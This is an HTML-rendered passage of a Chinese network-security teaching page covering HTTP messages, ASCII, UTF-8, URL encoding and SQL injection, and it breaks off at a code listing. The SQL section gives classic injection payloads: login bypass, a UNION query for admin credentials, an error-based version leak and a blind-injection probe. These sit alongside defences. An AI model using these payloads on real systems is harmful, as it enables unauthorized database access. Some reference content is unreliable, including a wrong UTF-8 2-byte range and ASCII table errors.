等。</li>\n<li>Web 服务器接收到的请求后，向客户端发送响应信息。</li>\n<li>HTTP 默认端口号为 80。（https 默认端口为 443）</li>\n</ul>\n<h2 id=\"http三个要点\"><a class=\"anchor\" href=\"#http三个要点\">#</a> HTTP 三个要点</h2>\n<ul>\n<li>\n<p><strong>HTTP 是无连接：</strong> 无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</p>\n</li>\n<li>\n<p><strong>HTTP 是媒体独立的：</strong> 这意味着，只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过 HTTP 发送。客户端以及服务器指定使用适合的 MIME-type 内容类型。</p>\n</li>\n<li>\n<p><strong>HTTP 是无状态：</strong> HTTP 协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</p>\n</li>\n</ul>\n<h2 id=\"http的消息结构\"><a class=\"anchor\" href=\"#http的消息结构\">#</a> HTTP 的消息结构</h2>\n<h3 id=\"请求\"><a class=\"anchor\" href=\"#请求\">#</a> 请求</h3>\n<ul>\n<li><strong>地址</strong>和<strong>动词</strong>：例如 <strong>GET <span class=\"exturl\" data-url=\"aHR0cDovL21lYy5iaXQuZWR1LmNuLw==\">http://mec.bit.edu.cn/</span></strong></li>\n<li><strong>请求头（header)</strong>：用来描述请求和发送者的一些信息</li>\n<li><strong>请求参数</strong>：以百度为例，要搜索的关键词。</li>\n</ul>\n<h3 id=\"响应\"><a class=\"anchor\" href=\"#响应\">#</a> 响应</h3>\n<ul>\n<li><strong>响应代码</strong>：200 表示成功，404 表示不存在等</li>\n<li><strong>响应头 header</strong>：描述相应内容的一些信息</li>\n<li><strong>响应内容</strong>：HTML, JSON, 图片等</li>\n</ul>\n<h3 id=\"示例-2\"><a class=\"anchor\" href=\"#示例-2\">#</a> 示例</h3>\n<h4 id=\"客户端请求\"><a class=\"anchor\" href=\"#客户端请求\">#</a> 客户端请求</h4>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET http:<span class=\"comment\">//www.example.com/hello.txt HTTP/1.1</span></span><br><span class=\"line\">User-Agent: curl/<span class=\"number\">7.16</span>.<span class=\"number\">3</span> libcurl/<span class=\"number\">7.16</span>.<span class=\"number\">3</span> OpenSSL/<span class=\"number\">0.9</span>.<span class=\"number\">7</span>l zlib/<span class=\"number\">1.2</span>.<span class=\"number\">3</span></span><br><span class=\"line\">Accept-Language: en, mi</span><br><span class=\"line\">Host: www.example.com</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"知识介绍\"><a class=\"anchor\" href=\"#知识介绍\">#</a> 知识介绍</h5>\n<h6 id=\"请求行\"><a class=\"anchor\" href=\"#请求行\">#</a> 请求行</h6>\n<ul>\n<li>\n<p><code>GET</code> : 这是 HTTP 请求方法。 <code>GET</code>  方法请求服务器发送指定资源（在这里是 <code>hello.txt</code> ）的表示形式。</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbS9oZWxsby50eHQqKjo=\">http://www.example.com/hello.txt**:</span> 这是请求的 URL，指向服务器上的资源 <code>hello.txt</code> 。</p>\n</li>\n<li>\n<p>HTTP/1.1**: 这是 HTTP 版本。HTTP/1.1 是目前最常用的版本，它支持持久连接、分块传输编码等功能。</p>\n</li>\n</ul>\n<h6 id=\"请求头\"><a class=\"anchor\" href=\"#请求头\">#</a> 请求头</h6>\n<ul>\n<li><strong>User-Agent</strong>: 这个头字段包含了发出请求的客户端程序的信息。这里的客户端是 <code>curl</code> ，版本是 <code>7.16.3</code> ，它使用了 <code>libcurl</code>  库（版本 <code>7.16.3</code> ），并且支持 <code>OpenSSL</code> （版本 <code>0.9.7l</code> ）和 <code>zlib</code> （版本 <code>1.2.3</code> ）。</li>\n<li><strong>Accept-Language</strong>: 这个头字段告诉服务器客户端希望接收的语言版本。这里客户端希望接收英文（ <code>en</code> ）和毛利语（ <code>mi</code> ）的内容。</li>\n<li><strong>Host</strong>: 这个头字段指定了请求的主机名。HTTP/1.1 要求所有请求必须包含这个头字段，以便服务器能够正确地处理请求，即使它是从多个虚拟主机中接收到的。3</li>\n</ul>\n<h6 id=\"完整解读\"><a class=\"anchor\" href=\"#完整解读\">#</a> 完整解读</h6>\n<p>这个 HTTP 请求的目的是从 <code>www.example.com</code>  服务器上获取 <code>hello.txt</code>  文件。它使用了 <code>GET</code>  方法，并提供了客户端的详细信息（包括使用的库和版本）。请求指定了客户端能够接受的语言，并且明确了请求的主机名。</p>\n<h4 id=\"服务端响应\"><a class=\"anchor\" href=\"#服务端响应\">#</a> 服务端响应:</h4>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\">Date: Mon, <span class=\"number\">27</span> Jul <span class=\"number\">2009</span> <span class=\"number\">12</span>:<span class=\"number\">28</span>:<span class=\"number\">53</span> GMT</span><br><span class=\"line\">Server: Apache</span><br><span class=\"line\">Last-Modified: Wed, <span class=\"number\">22</span> Jul <span class=\"number\">2009</span> <span class=\"number\">19</span>:<span class=\"number\">15</span>:<span class=\"number\">56</span> GMT</span><br><span class=\"line\">ETag: <span class=\"string\">&quot;34aa387-d-1568eb00&quot;</span></span><br><span class=\"line\">Accept-Ranges: bytes</span><br><span class=\"line\">Content-Length: <span class=\"number\">51</span></span><br><span class=\"line\">Vary: Accept-Encoding</span><br><span class=\"line\">Content-Type: text/plain</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"知识介绍-2\"><a class=\"anchor\" href=\"#知识介绍-2\">#</a> 知识介绍</h5>\n<h6 id=\"状态行\"><a class=\"anchor\" href=\"#状态行\">#</a> 状态行</h6>\n<ul>\n<li><strong>HTTP/1.1</strong>: 这是 HTTP 版本。服务器使用 HTTP/1.1 版本来响应请求。</li>\n<li><strong>200 OK</strong>: 这是状态码和状态消息。状态码 200 表示请求成功，服务器已经成功处理了请求。</li>\n</ul>\n<h6 id=\"响应头\"><a class=\"anchor\" href=\"#响应头\">#</a> 响应头</h6>\n<ul>\n<li><strong>Date</strong>: 这个头字段表示响应消息生成的日期和时间。时间是格林威治标准时间（GMT）。</li>\n<li><strong>Server</strong>: 这个头字段包含处理请求的服务器软件的信息。在这里，服务器使用的是 Apache 服务器。</li>\n<li><strong>Last-Modified</strong>: 这个头字段表示服务器上资源最后修改的日期和时间。它用于缓存控制和条件请求。</li>\n<li><strong>ETag</strong>: 这个头字段提供了资源的实体标签（ETag），用于缓存验证。ETag 是一个唯一的标识符，表示特定版本的资源。</li>\n<li><strong>Accept-Ranges</strong>: 这个头字段表示服务器是否支持范围请求（partial requests），即请求资源的部分内容。在这里， <code>bytes</code>  表示服务器支持字节范围请求。</li>\n<li><strong>Content-Length</strong>: 这个头字段表示响应消息主体的字节长度。在这里，响应内容的长度为 51 字节。</li>\n<li><strong>Vary</strong>: 这个头字段用于内容协商，表示服务器响应可能基于请求的不同 <code>Accept-Encoding</code>  头字段值而变化。也就是说，服务器根据客户端支持的编码类型返回不同的内容。</li>\n<li><strong>Content-Type</strong>: 这个头字段表示响应主体的媒体类型。在这里，响应内容是纯文本格式（ <code>text/plain</code> ）。</li>\n</ul>\n<h4 id=\"响应内容\"><a class=\"anchor\" href=\"#响应内容\">#</a> 响应内容</h4>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello World! My payload includes a trailing CRLF.</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"url介绍\"><a class=\"anchor\" href=\"#url介绍\">#</a> url 介绍</h1>\n<h2 id=\"基础知识介绍\"><a class=\"anchor\" href=\"#基础知识介绍\">#</a> 基础知识介绍</h2>\n<h3 id=\"ascii码\"><a class=\"anchor\" href=\"#ascii码\">#</a> ascii 码</h3>\n<p>ASCII (American Standard Code for Information Interchange) 美国信息互换标准代码：</p>\n<h4 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h4>\n<ul>\n<li><strong>定义</strong>：ASCII 是一种字符编码标准，用于表示英文字符及一些控制字符。</li>\n<li><strong>范围</strong>：使用 7 位二进制数表示字符，共有 128 个字符。</li>\n</ul>\n<h4 id=\"字符集\"><a class=\"anchor\" href=\"#字符集\">#</a> 字符集</h4>\n<ul>\n<li><strong>控制字符 (0-31)</strong>：这些字符用于控制文本的格式，如换行、回车、制表等。例如，ASCII 值 10 表示换行（LF），ASCII 值 13 表示回车（CR）。</li>\n<li><strong>可打印字符 (32-126)</strong>：包括空格、标点符号、数字、大小写字母等。例如，ASCII 值 65 表示字母 'A'，ASCII 值 97 表示字母 'a'。</li>\n<li><strong>删除字符 (127)</strong>：用于表示删除操作（DEL）。</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>ASCII 值</th>\n<th>控制字符</th>\n<th>ASCII 值</th>\n<th>控制字符</th>\n<th>ASCII 值</th>\n<th>控制字符</th>\n<th>ASCII 值</th>\n<th>控制字符</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>NUT</td>\n<td>32</td>\n<td>(space)</td>\n<td>64</td>\n<td>@</td>\n<td>96</td>\n<td>、</td>\n</tr>\n<tr>\n<td>1</td>\n<td>SOH</td>\n<td>33</td>\n<td>!</td>\n<td>65</td>\n<td>A</td>\n<td>97</td>\n<td>a</td>\n</tr>\n<tr>\n<td>2</td>\n<td>STX</td>\n<td>34</td>\n<td>&quot;</td>\n<td>66</td>\n<td>B</td>\n<td>98</td>\n<td>b</td>\n</tr>\n<tr>\n<td>3</td>\n<td>ETX</td>\n<td>35</td>\n<td>#</td>\n<td>67</td>\n<td>C</td>\n<td>99</td>\n<td>c</td>\n</tr>\n<tr>\n<td>4</td>\n<td>EOT</td>\n<td>36</td>\n<td>$</td>\n<td>68</td>\n<td>D</td>\n<td>100</td>\n<td>d</td>\n</tr>\n<tr>\n<td>5</td>\n<td>ENQ</td>\n<td>37</td>\n<td>%</td>\n<td>69</td>\n<td>E</td>\n<td>101</td>\n<td>e</td>\n</tr>\n<tr>\n<td>6</td>\n<td>ACK</td>\n<td>38</td>\n<td>&amp;</td>\n<td>70</td>\n<td>F</td>\n<td>102</td>\n<td>f</td>\n</tr>\n<tr>\n<td>7</td>\n<td>BEL</td>\n<td>39</td>\n<td>,</td>\n<td>71</td>\n<td>G</td>\n<td>103</td>\n<td>g</td>\n</tr>\n<tr>\n<td>8</td>\n<td>BS</td>\n<td>40</td>\n<td>(</td>\n<td>72</td>\n<td>H</td>\n<td>104</td>\n<td>h</td>\n</tr>\n<tr>\n<td>9</td>\n<td>HT</td>\n<td>41</td>\n<td>)</td>\n<td>73</td>\n<td>I</td>\n<td>105</td>\n<td>i</td>\n</tr>\n<tr>\n<td>10</td>\n<td>LF</td>\n<td>42</td>\n<td>*</td>\n<td>74</td>\n<td>J</td>\n<td>106</td>\n<td>j</td>\n</tr>\n<tr>\n<td>11</td>\n<td>VT</td>\n<td>43</td>\n<td>+</td>\n<td>75</td>\n<td>K</td>\n<td>107</td>\n<td>k</td>\n</tr>\n<tr>\n<td>12</td>\n<td>FF</td>\n<td>44</td>\n<td>,</td>\n<td>76</td>\n<td>L</td>\n<td>108</td>\n<td>l</td>\n</tr>\n<tr>\n<td>13</td>\n<td>CR</td>\n<td>45</td>\n<td>-</td>\n<td>77</td>\n<td>M</td>\n<td>109</td>\n<td>m</td>\n</tr>\n<tr>\n<td>14</td>\n<td>SO</td>\n<td>46</td>\n<td>.</td>\n<td>78</td>\n<td>N</td>\n<td>110</td>\n<td>n</td>\n</tr>\n<tr>\n<td>15</td>\n<td>SI</td>\n<td>47</td>\n<td>/</td>\n<td>79</td>\n<td>O</td>\n<td>111</td>\n<td>o</td>\n</tr>\n<tr>\n<td>16</td>\n<td>DLE</td>\n<td>48</td>\n<td>0</td>\n<td>80</td>\n<td>P</td>\n<td>112</td>\n<td>p</td>\n</tr>\n<tr>\n<td>17</td>\n<td>DCI</td>\n<td>49</td>\n<td>1</td>\n<td>81</td>\n<td>Q</td>\n<td>113</td>\n<td>q</td>\n</tr>\n<tr>\n<td>18</td>\n<td>DC2</td>\n<td>50</td>\n<td>2</td>\n<td>82</td>\n<td>R</td>\n<td>114</td>\n<td>r</td>\n</tr>\n<tr>\n<td>19</td>\n<td>DC3</td>\n<td>51</td>\n<td>3</td>\n<td>83</td>\n<td>S</td>\n<td>115</td>\n<td>s</td>\n</tr>\n<tr>\n<td>20</td>\n<td>DC4</td>\n<td>52</td>\n<td>4</td>\n<td>84</td>\n<td>T</td>\n<td>116</td>\n<td>t</td>\n</tr>\n<tr>\n<td>21</td>\n<td>NAK</td>\n<td>53</td>\n<td>5</td>\n<td>85</td>\n<td>U</td>\n<td>117</td>\n<td>u</td>\n</tr>\n<tr>\n<td>22</td>\n<td>SYN</td>\n<td>54</td>\n<td>6</td>\n<td>86</td>\n<td>V</td>\n<td>118</td>\n<td>v</td>\n</tr>\n<tr>\n<td>23</td>\n<td>TB</td>\n<td>55</td>\n<td>7</td>\n<td>87</td>\n<td>W</td>\n<td>119</td>\n<td>w</td>\n</tr>\n<tr>\n<td>24</td>\n<td>CAN</td>\n<td>56</td>\n<td>8</td>\n<td>88</td>\n<td>X</td>\n<td>120</td>\n<td>x</td>\n</tr>\n<tr>\n<td>25</td>\n<td>EM</td>\n<td>57</td>\n<td>9</td>\n<td>89</td>\n<td>Y</td>\n<td>121</td>\n<td>y</td>\n</tr>\n<tr>\n<td>26</td>\n<td>SUB</td>\n<td>58</td>\n<td>:</td>\n<td>90</td>\n<td>Z</td>\n<td>122</td>\n<td>z</td>\n</tr>\n<tr>\n<td>27</td>\n<td>ESC</td>\n<td>59</td>\n<td>;</td>\n<td>91</td>\n<td>[</td>\n<td>123</td>\n<td>{</td>\n</tr>\n<tr>\n<td>28</td>\n<td>FS</td>\n<td>60</td>\n<td>&lt;</td>\n<td>92</td>\n<td>\\</td>\n<td>124</td>\n<td></td>\n</tr>\n<tr>\n<td>29</td>\n<td>GS</td>\n<td>61</td>\n<td>=</td>\n<td>93</td>\n<td>]</td>\n<td>125</td>\n<td>}</td>\n</tr>\n<tr>\n<td>30</td>\n<td>RS</td>\n<td>62</td>\n<td>&gt;</td>\n<td>94</td>\n<td>^</td>\n<td>126</td>\n<td>`        |</td>\n</tr>\n<tr>\n<td>31</td>\n<td>US</td>\n<td>63</td>\n<td>?</td>\n<td>95</td>\n<td>_</td>\n<td>127</td>\n<td>DEL</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"utf-8码\"><a class=\"anchor\" href=\"#utf-8码\">#</a> UTF-8 码</h3>\n<p>UTF-8 (Unicode Transformation Format - 8-bit)：</p>\n<h4 id=\"概述-2\"><a class=\"anchor\" href=\"#概述-2\">#</a> 概述</h4>\n<ul>\n<li><strong>定义</strong>：UTF-8 是 Unicode 的一种可变长度字符编码，用于表示全球范围内的所有字符。</li>\n<li><strong>范围</strong>：使用 1 到 4 个字节表示字符，覆盖所有 Unicode 字符（最多可表示 1,112,064 个字符）。</li>\n</ul>\n<h4 id=\"编码机制\"><a class=\"anchor\" href=\"#编码机制\">#</a> 编码机制</h4>\n<ul>\n<li><strong>单字节 (1 Byte)</strong>：用于表示标准 ASCII 字符（0-127），与 ASCII 完全兼容。</li>\n<li><strong>多字节 (2-4 Bytes)</strong>：用于表示其他 Unicode 字符，根据字符的位置不同，使用不同数量的字节。字节数越多，表示的字符范围越广。\n<ul>\n<li><strong>2 字节</strong>：用于表示基本多语言平面（BMP）中的字符，范围是 U+0800 到 U+FFFF。</li>\n<li><strong>3 字节</strong>：用于表示更多语言字符，范围是 U+0800 到 U+FFFF。</li>\n<li><strong>4 字节</strong>：用于表示补充字符平面中的字符，范围是 U+010000 到 U+10FFFF。</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"优点\"><a class=\"anchor\" href=\"#优点\">#</a> 优点</h4>\n<ul>\n<li><strong>向后兼容 ASCII</strong>：单字节字符与 ASCII 完全兼容，确保旧系统的兼容性。</li>\n<li><strong>可变长度编码</strong>：对于常用字符，节省存储空间；对于特殊字符，提供足够的表示能力。</li>\n<li><strong>无字节序问题</strong>：UTF-8 是字节序独立的，避免了多字节编码中的字节序问题。</li>\n</ul>\n<h2 id=\"组成成分\"><a class=\"anchor\" href=\"#组成成分\">#</a> 组成成分</h2>\n<p>现在给一个示例 url:</p>\n<p><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://username:password@www.example.com:8080/path/to/resource.html?query1=value1&amp;query2=value2#section2</span><br></pre></td></tr></table></figure></p>\n<p>让我们来逐一解析这个 url 的组成成分</p>\n<ol>\n<li><strong>协议（Scheme）</strong>： <code>https</code> ：表示使用的是超文本传输安全协议（HTTPS）。</li>\n<li><strong>用户信息（User Information）</strong>（可选）： <code>username:password</code> ：用于身份验证的信息，包含用户名和密码。这个部分很少使用，因为它会暴露在 URL 中，存在安全风险。</li>\n<li><strong>主机名（Host）</strong>： <code>www.example.com</code> ：这是服务器的域名，指向存储资源的服务器。</li>\n<li><strong>端口（Port）</strong>（可选）： <code>8080</code> ：指定了使用的端口号。默认的 HTTPS 端口是 443，但如果使用了非默认端口，则需要在 URL 中明确指定。</li>\n<li><strong>路径（Path）</strong>： <code>/path/to/resource.html</code> ：这是服务器上的资源路径，指向具体的文件或资源。在这个例子中，它是 <code>resource.html</code>  文件，位于 <code>/path/to</code>  目录下。</li>\n<li><strong>查询字符串（Query String）</strong>（可选）： <code>?query1=value1&amp;query2=value2</code> ：这是查询参数，通常用于传递参数给服务器。查询字符串以 <code>?</code>  开始，多个参数之间用 <code>&amp;</code>  分隔。在这个例子中，查询字符串包含两个参数 <code>query1</code>  和 <code>query2</code> ，它们的值分别为 <code>value1</code>  和 <code>value2</code> 。</li>\n<li><strong>片段标识符（也称锚点）（Fragment Identifier）</strong>（可选）： <code>#section2</code> ：用于在资源内进行定位或跳转到特定的部分。在这个例子中，它表示跳转到资源中的 <code>section2</code>  部分。</li>\n</ol>\n<h2 id=\"字符与转义\"><a class=\"anchor\" href=\"#字符与转义\">#</a> 字符与转义</h2>\n<p>URL 的各个组成部分，只能使用以下这些字符：</p>\n<ul>\n<li>26 个英语字母（包括大写和小写）</li>\n<li>10 个阿拉伯数字</li>\n<li>连词号（-）</li>\n<li>句点（.）</li>\n<li>下划线（_）</li>\n</ul>\n<p>如果出现了这些字符外的符号，则需要进行转义，url 的转义规则如下：</p>\n<ul>\n<li>转义是通过使用百分号（%）后跟字符的 ASCII 十六进制值来实现的</li>\n<li><strong>空格</strong>：空格在 URL 中不允许，可以使用 <code>%20</code>  或加号（ <code>+</code> ）来表示（但加号仅在查询字符串中有效）。</li>\n<li><strong>特殊字符</strong>：如 <code>&lt;</code> ,  <code>&gt;</code> ,  <code>#</code> ,  <code>%</code> ,  <code>&#123;</code> ,  <code>&#125;</code> ,  <code>|</code> ,  <code>\\</code> ,  <code>^</code> ,  <code>~</code> ,  <code>[</code> ,  <code>]</code> , 和  <code>&quot;</code>  等，在 URL 中需要转义。\n<ul>\n<li><code>#</code> ： <code>%23</code></li>\n<li><code>%</code> ： <code>%25</code></li>\n<li><code>/</code> ： <code>%2F</code></li>\n<li><code>:</code> ： <code>%3A</code></li>\n<li><code>@</code> ： <code>%40</code></li>\n<li><code>&amp;</code> ： <code>%26</code></li>\n<li><code>=</code> ： <code>%3D</code></li>\n<li><code>?</code> ： <code>%3F</code></li>\n</ul>\n</li>\n<li><strong>非 ASCII 字符</strong>：所有非 ASCII 字符都必须进行转义，使用其 UTF-8 编码的字节，然后每个字节转换为 <code>%HH</code>  格式。</li>\n</ul>\n<h3 id=\"中文的转义\"><a class=\"anchor\" href=\"#中文的转义\">#</a> 中文的转义</h3>\n<p>中文字符在 URL 中也必须进行转义。它们首先被转换为 UTF-8 编码，然后每个字节转换为 <code>%HH</code>  格式。</p>\n<p>示例： <code>https://enjundu.github.io/IntroductiontoNetSecurityLab/应用安全/</code></p>\n<ol>\n<li><strong>将中文字符转换为 UTF-8 编码</strong>：\n<ul>\n<li><code>应</code> 的 UTF-8 编码为 <code>E5 BA 94</code></li>\n<li><code>用</code> 的 UTF-8 编码为 <code>E7 94 A8</code></li>\n<li><code>安</code> 的 UTF-8 编码为 <code>E5 AE 89</code></li>\n<li><code>全</code> 的 UTF-8 编码为 <code>E5 85 A8</code></li>\n</ul>\n</li>\n<li><strong>将 UTF-8 编码的每个字节表示为两个十六进制数字，并在前面加上百分号（%）</strong>:\n<ul>\n<li><code>应</code> ： <code>%E5%BA%94</code></li>\n<li><code>用</code> ： <code>%E7%94%A8</code></li>\n<li><code>安</code> ： <code>%E5%AE%89</code></li>\n<li><code>全</code> ： <code>%E5%85%A8</code></li>\n</ul>\n</li>\n<li>因此最终的转义结果为 <code>https://enjundu.github.io/IntroductiontoNetSecurityLab/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/</code></li>\n</ol>\n<h1 id=\"sql注入\"><a class=\"anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<p>**SQL 注入（SQL Injection）** 是一种代码注入技术，利用不当的输入处理来向应用程序的 SQL 查询中注入恶意的 SQL 代码，从而执行未经授权的数据库操作。</p>\n<h2 id=\"sql原理\"><a class=\"anchor\" href=\"#sql原理\">#</a> SQL 原理</h2>\n<ul>\n<li><strong>输入处理不当</strong>：当应用程序没有正确过滤或转义用户输入时，攻击者可以通过输入恶意的 SQL 代码来篡改应用程序生成的 SQL 查询。</li>\n<li><strong>注入 SQL 代码</strong>：攻击者在用户输入字段中插入特制的 SQL 片段，使得这些片段被直接包含在 SQL 查询中，从而改变查询的原意。</li>\n</ul>\n<h2 id=\"for-example\"><a class=\"anchor\" href=\"#for-example\">#</a> for example</h2>\n<p>假设有一个简单的登录表单，起 SQL 查询如下：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * FROM users WHERE username = <span class=\"string\">&#x27;user_input&#x27;</span> AND password = <span class=\"string\">&#x27;user_pass&#x27;</span>;</span><br></pre></td></tr></table></figure></p>\n<p>如果应用程序直接将用户输入的内容插入到 SQL 查询中，而没有任何处理，那么攻击者可以在用户名字段中输入如下内容：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; OR &#x27;</span><span class=\"number\">1</span><span class=\"string\">&#x27;=&#x27;</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<p>这样生成的 SQL 查询如下：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * FROM users WHERE username = <span class=\"string\">&#x27;&#x27;</span> OR <span class=\"string\">&#x27;1&#x27;</span>=<span class=\"string\">&#x27;1&#x27;</span> AND password = <span class=\"string\">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"分析\"><a class=\"anchor\" href=\"#分析\">#</a> 分析</h3>\n<ul>\n<li><code>username = '' OR '1'='1'</code> ：由于 <code>'1'='1'</code>  总是为真，整个查询条件始终为真，导致查询返回所有用户记录。</li>\n<li><strong>结果</strong>：攻击者成功绕过了身份验证，可能访问到受保护的数据。</li>\n</ul>\n<h2 id=\"常见sql注入类型\"><a class=\"anchor\" href=\"#常见sql注入类型\">#</a> 常见 SQL 注入类型</h2>\n<ol>\n<li>\n<p>联合查询注入利用 SQL 的 <code>UNION</code>  关键字将恶意查询结果与合法查询结果合并。攻击者可以通过这种方式从数据库中获取额外的数据。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT name, email FROM users WHERE <span class=\"built_in\">id</span> = <span class=\"number\">1</span> UNION SELECT username, password FROM admin;</span><br></pre></td></tr></table></figure></p>\n<p>​\t在这个示例中，攻击者试图获取 <code>admin</code>  表中的 <code>username</code>  和 <code>password</code> 。原始查询是从 <code>users</code>  表中根据 ID 获取用户的 <code>name</code>  和 <code>email</code> ，但通过使用 <code>UNION</code>  关键字，攻击者能够将两个查询的结果合并在一起。</p>\n<ul>\n<li><code>UNION</code>  关键字用于将两个或多个 SELECT 语句的结果组合成一个结果集。</li>\n<li>攻击者将合法查询的结果（如 <code>SELECT name, email FROM users WHERE id = 1</code> ）与恶意查询的结果（如 <code>SELECT username, password FROM admin</code> ）合并。</li>\n<li>这样一来，如果数据库执行了整个联合查询，攻击者就能获取到 admin 表中的用户名和密码等敏感信息。</li>\n</ul>\n</li>\n<li>\n<p><strong>错误注入（Error-based SQL Injection）</strong>：错误注入通过故意引发 SQL 错误来获取数据库结构信息。通过分析错误消息中的信息，攻击者可以推断出数据库的结构或版本等敏感信息。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * FROM users WHERE <span class=\"built_in\">id</span> = <span class=\"number\">1</span><span class=\"string\">&#x27; AND 1=CONVERT(int,(SELECT @@version)); --&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<p>​\t在这个示例中，攻击者试图通过故意触发类型转换错误来获取数据库的版本信息。</p>\n<ul>\n<li><code>@@version</code>  是一个系统变量，返回数据库的版本信息。</li>\n<li>攻击者在原始查询的基础上加入一个引发错误的子查询，例如将 <code>@@version</code>  转换为整数。</li>\n<li>数据库在执行这个查询时会因为类型转换错误而返回一个错误消息。</li>\n<li>错误消息中通常包含有用的信息，攻击者可以利用这些信息来推断数据库的细节，如表结构、列名等。</li>\n</ul>\n</li>\n<li>\n<p><strong>盲注（Blind SQL Injection）</strong>：利用条件查询，通过判断应用程序响应的不同来推测数据库内容。</p>\n<p>​\t盲注利用条件查询，通过判断应用程序响应的不同来推测数据库内容。在盲注中，攻击者无法直接看到查询结果，但可以通过分析应用程序的响应（如页面是否正常加载、响应时间等）来推断数据。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * FROM users WHERE <span class=\"built_in\">id</span> = <span class=\"number\">1</span> AND (SELECT SUBSTRING(database(), <span class=\"number\">1</span>, <span class=\"number\">1</span>)) = <span class=\"string\">&#x27;a&#x27;</span>;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>SUBSTRING(database(), 1, 1)</code>  函数提取当前数据库名的第一个字符。</li>\n<li>攻击者将这个字符与字母 <code>'a'</code>  进行比较。</li>\n<li>如果条件为真（即第一个字符是 <code>'a'</code> ），查询将返回结果，应用程序的响应将显示正常。</li>\n<li>如果条件为假（即第一个字符不是 <code>'a'</code> ），查询将不返回结果，应用程序的响应将有所不同（如显示错误消息或页面加载不完全）。</li>\n<li>通过不断改变条件（如尝试 <code>'b'</code> 、 <code>'c'</code>  等），攻击者可以逐字符猜测出数据库的名称或其他敏感信息。</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"防御措施\"><a class=\"anchor\" href=\"#防御措施\">#</a> 防御措施</h2>\n<ol>\n<li>\n<p><strong>使用参数化查询和预编译语句</strong>：避免将用户输入直接插入 SQL 查询中，使用预编译语句确保输入内容被当作数据处理。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cursor.execute(<span class=\"string\">&quot;SELECT * FROM users WHERE username = %s AND password = %s&quot;</span>, (user_input, user_pass))</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p><strong>输入验证和过滤</strong>：对用户输入进行严格的验证和过滤，确保输入符合预期格式。</p>\n</li>\n<li>\n<p><strong>最小权限原则</strong>：数据库用户仅应拥有最低权限，限制数据操作权限以减少被攻击后的损失。</p>\n</li>\n<li>\n<p><strong>使用 ORM 框架</strong>：利用 ORM 框架（如 Django ORM）生成 SQL 查询，自动防止 SQL 注入。</p>\n</li>\n<li>\n<p><strong>安全编码实践</strong>：遵循安全编码的最佳实践，定期进行安全审计和代码评审。</p>\n</li>\n</ol>\n<h2 id=\"动手感受\"><a class=\"anchor\" href=\"#动手感受\">#</a> 动手感受</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0VuanVuRHUvU1FMLWV4YW1wbGU=\">源代码</span>：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0VuanVuRHUvU1FMLWV4YW1wbGU=\">https://github.com/EnjunDu/SQL-example</span></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 